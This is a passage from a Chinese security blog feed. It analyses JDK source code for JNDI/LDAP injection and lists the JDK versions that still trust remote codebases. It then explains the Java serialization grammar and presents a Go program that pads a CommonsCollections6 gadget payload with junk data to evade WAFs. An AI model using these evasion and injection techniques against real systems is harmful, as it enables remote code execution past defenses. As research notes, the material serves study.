<span class="hljs-operator">=</span> getObjectFactoryBuilder();<br>           <span class="hljs-keyword">if</span> (builder != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">// builder must return non-null factory</span><br>               factory = builder.createObjectFactory(refInfo, environment);<br>               <span class="hljs-keyword">if</span> (factory <span class="hljs-keyword">instanceof</span> DirObjectFactory) &#123;<br>                   <span class="hljs-keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(<br>                       refInfo, name, nameCtx, environment, attrs);<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,<br>                       environment);<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-comment">// use reference if possible</span><br>           <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>           <span class="hljs-comment">//判断reference对象是否为Reference</span><br>           <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Reference) &#123;<br>                <span class="hljs-comment">//转换为Reference类型</span><br>               ref = (Reference) refInfo;<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Referenceable) &#123;<br>               ref = ((Referenceable)(refInfo)).getReference();<br>           &#125;<br><br>           Object answer;<br>           <span class="hljs-comment">//reference对象是否为空</span><br>           <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">//获取工厂类名Exp</span><br>               <span class="hljs-type">String</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ref.getFactoryClassName();<br>               <span class="hljs-keyword">if</span> (f != <span class="hljs-literal">null</span>) &#123;<br>                   <span class="hljs-comment">// if reference identifies a factory, use exclusively</span><br>                   <span class="hljs-comment">//根据工厂类远程获取对象引用</span><br>                   factory = getObjectFactoryFromReference(ref, f);<br>                   <span class="hljs-keyword">if</span> (factory <span class="hljs-keyword">instanceof</span> DirObjectFactory) &#123;<br>                       <span class="hljs-keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(<br>                           ref, name, nameCtx, environment, attrs);<br>                   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) &#123;<br>                       <span class="hljs-keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<br>                                                        environment);<br>                   &#125;<br>                   <span class="hljs-comment">// No factory found, so return original refInfo.</span><br>                   <span class="hljs-comment">// Will reach this point if factory class is not in</span><br>                   <span class="hljs-comment">// class path and reference does not contain a URL for it</span><br>                   <span class="hljs-keyword">return</span> refInfo;<br><br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-comment">// if reference has no factory, check for addresses</span><br>                   <span class="hljs-comment">// containing URLs</span><br>                   <span class="hljs-comment">// ignore name &amp; attrs params; not used in URL factory</span><br><br>                   answer = processURLAddrs(ref, name, nameCtx, environment);<br>                   <span class="hljs-keyword">if</span> (answer != <span class="hljs-literal">null</span>) &#123;<br>                       <span class="hljs-keyword">return</span> answer;<br>                   &#125;<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-comment">// try using any specified factories</span><br>           answer = createObjectFromFactories(refInfo, name, nameCtx,<br>                                              environment, attrs);<br>           <span class="hljs-keyword">return</span> (answer != <span class="hljs-literal">null</span>) ? answer : refInfo;<br><br>   &#125;<br></code></pre></td></tr></table></figure><p><code>getObjectInstance</code>方法将<code>reference</code>对象转换为<code>Reference</code>类型并判断<code>reference</code>对象是否为空，如果不为空则从<code>reference</code>引用中获取工厂类<code>Exp</code>名字，接着调用<code>getObjectFactoryFromReference</code>方法根据工厂类Exp名字获取远程调用对象。</p><p><code>getObjectFactoryFromReference</code>方法实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> ObjectFactory <span class="hljs-title function_">getObjectFactoryFromReference</span><span class="hljs-params">(Reference ref, String factoryName)</span> <span class="hljs-keyword">throws</span> IllegalAccessException,InstantiationException, MalformedURLException &#123;<br>    Class&lt;?&gt; clas = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-comment">// Try to use current class loader</span><br>    <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-comment">//尝试先在本地加载Exp类</span><br>         clas = helper.loadClass(factoryName);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        <span class="hljs-comment">// ignore and continue</span><br>        <span class="hljs-comment">// e.printStackTrace();</span><br>    &#125;<br>    <span class="hljs-comment">// All other exceptions are passed up.</span><br><br>    <span class="hljs-comment">// Not in class path; try to use codebase</span><br>    String codebase;<br>    <span class="hljs-comment">//获取远程地址</span><br>    <span class="hljs-keyword">if</span> (clas == <span class="hljs-literal">null</span> &amp;&amp; (codebase = ref.getFactoryClassLocation()) != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//loadClass方法远程加载Exp类</span><br>            clas = helper.loadClass(factoryName, codebase);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (clas != <span class="hljs-literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/e81b0bd5-336c-4141-8925-dc09a0ccfa3d.png" alt="ldap_low6.png"> </p><p>可以看到<code>LDAP</code>服务跟<code>jndi</code>一样，会尝试先在本地查找加载<code>Exp</code>类，如果本地没有找到<code>Exp</code>类，那么<code>getFactoryClassLocation</code>方法会获取远程加载的<code>url</code>地址，如果不为空则根据远程<code>url</code>地址使用类加载器<code>URLClassLoader</code>来加载<code>Exp</code>类，通过分析发现<code>LDAP</code>服务的整个利用流程都没有<code>URLCodebase</code>限制。<br>看一下整个调用站栈</p><p><img src="D:/mdimage/b956cc02-77f5-47b0-91fb-b50bd619731e.png" alt="ldap_low7.png"> </p><p><a href="https://tttang.com/archive/1611/#toc__2">JNDI注入分析 - 跳跳糖 (tttang.com)</a></p><p><a href="https://paper.seebug.org/942/#2-rmi-jndi-reference-payload">如何绕过高版本 JDK 的限制进行 JNDI 注入利用 (seebug.org)</a></p><p>后面这块没搞明白了，挖个坑</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><code>JDK 5U45</code>、<code>6U45</code>、<code>7u21</code>、<code>8u121</code> 开始 <code>java.rmi.server.useCodebaseOnly</code> 默认配置为<code>true</code></li><li><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code></li><li><code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code> 开始 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 默认为<code>false</code></li></ul><p>由于<code>JNDI</code>注入动态加载的原理是使用<code>Reference</code>引用<code>Object Factory</code>类，其内部在上文中也分析到了使用的是<code>URLClassLoader</code>，所以不受<code>java.rmi.server.useCodebaseOnly=false</code>属性的限制。<br>但是不可避免的受到 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>的限制。</p><p>所以，<code>JNDI-RMI</code>注入方式有： <code>codebase</code>(<code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code>之前可以)  </p><p>利用本地<code>Class Factory</code>作为<code>Reference Factory</code></p><p><code>JNDI-LDAP</code>注入方式： <code>codebase</code>(<code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之前可以) </p><p> <code>serialize</code>（两个切入点）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化协议构造与分析</title>
    <link href="/decemberus.com/2022/12/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <url>/decemberus.com/2022/12/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化协议构造与分析"><a href="#Java反序列化协议构造与分析" class="headerlink" title="Java反序列化协议构造与分析"></a>Java反序列化协议构造与分析</h1><p>首先我们需要理解这个Grammer：<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">Java Object Serialization Specification: 6 - Object Serialization Stream Protocol (oracle.com)</a></p><h2 id="初步理解反序列化"><a href="#初步理解反序列化" class="headerlink" title="初步理解反序列化"></a>初步理解反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">stream:<br>magic version contents<br>contents:<br>content<br>contents content<br>content:<br>object<br>blockdata<br>object:<br>newObject<br>newClass<br>newArray<br>newString<br>newEnum<br>newClassDesc<br>prevObject<br>nullReference<br>exception<br>TC_RESET<br></code></pre></td></tr></table></figure><p>这是一个依次展开的巴科斯范式。我们从第一个stream开始看起，stream就是指完整的序列化协议流，</p><p>它是有三部分组成：magic、version和contents。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_MAGIC = (<span class="hljs-type">short</span>)<span class="hljs-number">0xaced</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_VERSION = <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>magic等于0xaced，version等于5，这两个变量都是short类型，也就是两个字节的整型。这也就是为什么我们说序列化协议流是以 \xAC\xED\x00\x05 开头的原因。</p><p>接着， contents 在下面两行定义。可见， contents 等于 content ，或者 contents content 。怎么理解呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">contents:<br>  content<br>  contents content<br></code></pre></td></tr></table></figure><p>这里实际上是一个简单的递归下降的规则， contents 可以由一个 content 组成，也可以由一个contents 与一个 content 组成，而后面这种情况里的 contents 又可以继续由这两种情况组成，最后形成编译原理里所谓的左递归。</p><p>我们不用理解这么复杂的内容，因为这个例子非常简单，所以我们很容易地可以理解为： <strong>contents 是有一个或多个content 组成。</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-attribute">content</span>:<br>  <span class="hljs-selector-tag">object</span><br>  blockdata<br></code></pre></td></tr></table></figure><p>content又是由object和blockdata组成</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe">object:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Object</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Class</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Array</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">String</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Enum</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  prevObject<br>  nullReference<span class="hljs-comment">//表示一个null</span><br>  exception<br>  TC_RESET<span class="hljs-comment">//重置Reference ID</span><br></code></pre></td></tr></table></figure><p>要重点区分一下对象<code>newObject</code>,类<code>newClass</code>,类定义<code>newClassDesc</code></p><p>这里对象和类的区别，就是前者是一个类实例化的对象，而后者就是这个类本身</p><p><code>newObject</code>和<code>newClass</code>的Grammer也需好好关注</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">new</span><span class="hljs-type">Class</span>:<br>  TC_CLASS classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span><br><br>classDesc:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  nullReference<br>  (ClassDesc)prevObject      <span class="hljs-comment">// an object required to be of type</span><br>                             <span class="hljs-comment">// ClassDesc</span><br>                             <br><span class="hljs-keyword">new</span><span class="hljs-type">Object</span>:<br>  TC_OBJECT classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> classdata[]  <span class="hljs-comment">// data for each class</span><br></code></pre></td></tr></table></figure><p>可见， <code>newObject</code> 和 <code>newClass</code> 都是由一个标示符+ <code>classDesc</code> + <code>newHandle</code> 组成，只不过 <code>newObject</code>多一个 <code>classdata[]</code> 。原因是，它是一个对象，其包含了实例化类中的数据，这些数据就储存在<code>classdata[]</code> 中。</p><p><code>classDesc</code> 就是我们前面说的类定义，不过这个 <code>classDesc</code> 和前面的 <code>newClassDesc</code> 稍微有点区别，<code>classDesc</code> 可以是一个普通的 <code>newClassDesc</code> ，也可以是一个null，也可以是一个指针，指向任意前面已经出现过的其他的类定义。我们只要简单把 <code>classDesc</code> 理解为对 <code>newClassDesc</code> 的一个封装即可</p><p><code>newHandle</code> 是一个唯一ID，序列化协议里的每一个结构都拥有一个ID，这个ID由 0x7E0000 开始，每遇到下一个结构就+1，并设置成这个结构的唯一ID。而我前面说的 <code>prevObject</code> 指针，就是通过这个ID来定位它指向的结构。</p><p><strong>TC_的含义</strong></p><blockquote><p>在上面的代码解释中经常能看见TC_开头的一些参数，他主要是Type Code的缩写，表示一个字节标记的类型</p><p>在Java序列化中，数据流是按照块（Object、Array、Primitive Type）进行分割的。每个块都会以特定的标识符（Type Code）开头，用于标识这个块的类型。常见的Type Code包括：</p><ul><li>TC_OBJECT（对象）</li><li>TC_CLASSDESC（类描述符）</li><li>TC_ARRAY（数组）</li><li>TC_STRING（字符串）</li><li>TC_LONGSTRING（长字符串）</li><li>TC_NULL（null值）</li><li>TC_REFERENCE（引用）</li><li>TC_EXCEPTION（异常）</li><li>TC_BLOCKDATA（数据块）</li><li>TC_ENDBLOCKDATA（数据块结束）</li></ul><p>因此，”TC_”前缀可以让序列化器和反序列化器在处理数据流时快速识别块的类型，以便正确地解析数据。</p></blockquote><h2 id="序列化的解析成果"><a href="#序列化的解析成果" class="headerlink" title="序列化的解析成果"></a>序列化的解析成果</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> String name;<br>    <span class="hljs-keyword">protected</span>  User parent;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParent</span><span class="hljs-params">(User parent)</span><br>    &#123;<br>        <span class="hljs-built_in">this</span>.parent=parent;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">bob</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;bob&quot;</span>);<br>        bob.setParent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Josa&quot;</span>));<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(bob);<br>        System.out.println(Base64.encodeBase64String(byteArrayOutputStream.toByteArray()));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">//输出</span><br>r<span class="hljs-meta">O0</span>ABX<span class="hljs-symbol">NyABd5</span>c<span class="hljs-number">29</span>zZXJpYWwucHJhY<span class="hljs-number">3</span>RpY<span class="hljs-number">2</span>UuVX<span class="hljs-symbol">NlcpHNaOa2</span><span class="hljs-symbol">n6</span><span class="hljs-name">m0</span>AgACTAAEbmFtZXQAEkxqYXZhL<span class="hljs-number">2</span>xhbmcvU<span class="hljs-number">3</span>RyaW<span class="hljs-number">5</span><span class="hljs-symbol">nO0</span>wAB<span class="hljs-symbol">nBhcmVudHQAGUx5</span>c<span class="hljs-number">29</span>zZXJpYWw<span class="hljs-attr">vcHJhY3</span>RpY<span class="hljs-number">2</span>UvVX<span class="hljs-symbol">Nlcjt4</span>cHQAA<span class="hljs-number">2</span>JvY<span class="hljs-symbol">nNxAH4</span>AAHQABEp<span class="hljs-attr">vc2</span>Fw<br></code></pre></td></tr></table></figure><p>将得到的Base64的数据流用zkar进行分析</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258792.png" alt="image-20230223224253392"> </p><p>可见，这里 contents 只包含一个 newObject ，其第一部分是 ClassDesc ，包含了User这个类的信息，比如类名、SerialVersionUID、父类、属性列表等。</p><p>这个 classDesc 的ID就是8257536，而在 []classData 数组中，包含两个属性， name 和 parent ，parent 也是一个 newObject ，它实际上在源码中是一个User类对象，所以 classDesc 也是User类的信息，因为前面已经定义过了，所以这个类是一个Reference，ID也是8257536，表示指向前面User类的ClassDesc。</p><p>通过这个简单的案例，我们可以理解Java是怎么序列化一个类的。当然，实际情况会比这个例子要复杂很多，但我们只需要按照Grammer中的语法进行分析，再结合zkar的执行结果，即可很好地理解序列化协议了</p><h2 id="构造包含垃圾的序列化流"><a href="#构造包含垃圾的序列化流" class="headerlink" title="构造包含垃圾的序列化流"></a>构造包含垃圾的序列化流</h2><h3 id="C0ny"><a href="#C0ny" class="headerlink" title="C0ny"></a>C0ny</h3><p>先来看看c0ny师傅的大体思路</p><p>思路是需要找到一个class可以序列化，它可以把我们的脏数据对象和ysoserial gadget对象一起包裹起来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class A&#123;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10000</span>]&#123;<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12.</span>....&#125;<br>.....<br>yso Gadget<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们要找的class，第一需要实现java.io.Serializable接口，第二可以存储任意对象。这么看来集合类型就非常符合我们的需求。</p><ol><li><p>ArrayList</p></li><li><p>LinkedList</p></li><li><p>HashMap</p></li></ol><p>…..</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258276.png" alt="image-20230223230550344"> </p><p>所以我们可以改造ysoserial</p><p>大致的流程调用是，构造函数传入gadget对象以及垃圾数据长度，然后调用doWrap方法随机创建一个集合类型把随机生成的脏数据和gadget对象存储起来，最终序列化该对象即可拿到bypass WAF的序列化数据。具体实现参考<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">代码和注释</a></p><p>完整的项目看这个</p><p><a href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据 (qq.com)</a></p><h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>c0ny师傅的大体思路就是把Gadget和脏数据一起放入一个集合对象中</p><p>但是还有其他的操作</p><p>content是由object和blockdata组成，而blockdata是一个适合用来填充藏</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino">content:<br>object<br>blockdata<br><br>blockdata:<br>blockdatashort<br>blockdatalong<br><br>blockdatashort:<br><span class="hljs-built_in">TC_BLOCKDATA</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">byte</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br><br>blockdatalong:<br><span class="hljs-built_in">TC_BLOCKDATALONG</span> (<span class="hljs-type">int</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br></code></pre></td></tr></table></figure><p>我们选择<code>blockdatalong</code></p><p>我们编写一个简单的Go程序，并调用zkar库中的结构和方法，来构造这个填充了垃圾字符的CommonsCollections6的Payload：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;cc6.ser&quot;</span>)<br>serialization, err := serz.FromBytes(data)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>&#125;<br><span class="hljs-keyword">var</span> blockData = &amp;serz.TCContent&#123;<br>Flag: serz.JAVA_TC_BLOCKDATALONG,<br>BlockData: &amp;serz.TCBlockData&#123;<br>Data: []<span class="hljs-type">byte</span>(strings.Repeat(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">40000</span>)),<br>&#125;,<br>&#125;<br>serialization.Contents = <span class="hljs-built_in">append</span>(serialization.Contents, blockData)<br>ioutil.WriteFile(<span class="hljs-string">&quot;cc6-padding.ser&quot;</span>, serialization.ToBytes(), <span class="hljs-number">0</span>o755)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CB与无依赖shiro利用链</title>
    <link href="/decemberus.com/2022/12/03/CommonsBeanutils%E4%B8%8E%E6%97%A0%E4%BE%9D%E8%B5%96shiro%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/decemberus.com/2022/12/03/CommonsBeanutils%E4%B8%8E%E6%97%A0%E4%BE%9D%E8%B5%96shiro%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h1><p><code>java.util.PriorityQueue</code>可以利用Comparator的compare()方法，接下来我们需要寻找能否找到其他可以利用的<code>java.util.Comparator</code></p><h2 id="JavaBean的简单回顾"><a href="#JavaBean的简单回顾" class="headerlink" title="JavaBean的简单回顾"></a>JavaBean的简单回顾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;catalina&quot;</span>;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单来说就是含有getter和setter两个方法的类</p><p>commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意JavaBean的getter方法，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(), <span class="hljs-string">&quot;name&quot;</span>);<br></code></pre></td></tr></table></figure><p>此时，commons-beanutils会自动找到name属性的getter方法，也就是 getName ，然后调用，获得返回值。除此之外， PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 PropertyUtils.getProperty(a, “b.c”); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。</p><h2 id="getter的妙用"><a href="#getter的妙用" class="headerlink" title="getter的妙用"></a>getter的妙用</h2><p>我们需要找可以利用的 java.util.Comparator 对象，在commons-beanutils包中就存在一个： <code>org.apache.commons.beanutils.BeanComparator</code> 。</p><p><code>BeanComparator</code> 是<code>commons-beanutils</code>提供的用来比较两个JavaBean是否相等的类，其实现了<code>java.util.Comparator</code> 接口。我们看它的compare方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> 